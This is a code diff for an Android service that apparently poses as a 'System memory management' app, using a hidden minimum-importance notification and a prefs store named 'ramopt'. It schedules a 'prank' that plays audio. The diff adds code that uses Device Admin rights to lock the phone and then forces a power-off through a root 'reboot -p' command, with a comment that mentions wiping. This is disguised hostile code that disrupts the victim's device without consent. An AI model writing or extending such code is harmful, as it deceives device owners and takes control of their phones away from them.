@@ -4,6 +4,8 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.media.MediaPlayer;
 import android.os.IBinder;
@@ -57,9 +59,7 @@ public class SchedulerService extends Service {
     }
 
     private void startChecking() {
-        if (timer != null) {
-            timer.cancel();
-        }
+        if (timer != null) timer.cancel();
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
@@ -86,9 +86,7 @@ public class SchedulerService extends Service {
 
     private void triggerPrank() {
         try {
-            if (mediaPlayer != null) {
-                mediaPlayer.release();
-            }
+            if (mediaPlayer != null) mediaPlayer.release();
             mediaPlayer = MediaPlayer.create(this, audioResId);
             if (mediaPlayer != null) {
                 mediaPlayer.setOnCompletionListener(mp -> {
@@ -108,7 +106,24 @@ public class SchedulerService extends Service {
         try {
             android.content.SharedPreferences prefs = getSharedPreferences("ramopt", MODE_PRIVATE);
             prefs.edit().putBoolean("isSet", false).apply();
-            Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
+
+            // Try Device Admin shutdown first
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
+            if (dpm != null && dpm.isAdminActive(adminComponent)) {
+                dpm.lockNow();
+                // Short delay then wipe/shutdown
+                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
+                    } catch (Exception ex) {
+                        ex.printStackTrace();
+                    }
+                }, 500);
+            } else {
+                // Fallback to root
+                Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -116,16 +131,11 @@ public class SchedulerService extends Service {
 
     private void createNotificationChannel() {
         NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID,
-                "System",
-                NotificationManager.IMPORTANCE_MIN
-        );
+                CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN);
         channel.setDescription("System memory management");
         channel.setShowBadge(false);
         NotificationManager manager = getSystemService(NotificationManager.class);
-        if (manager != null) {
-            manager.createNotificationChannel(channel);
-        }
+        if (manager != null) manager.createNotificationChannel(channel);
     }
 
     @Override
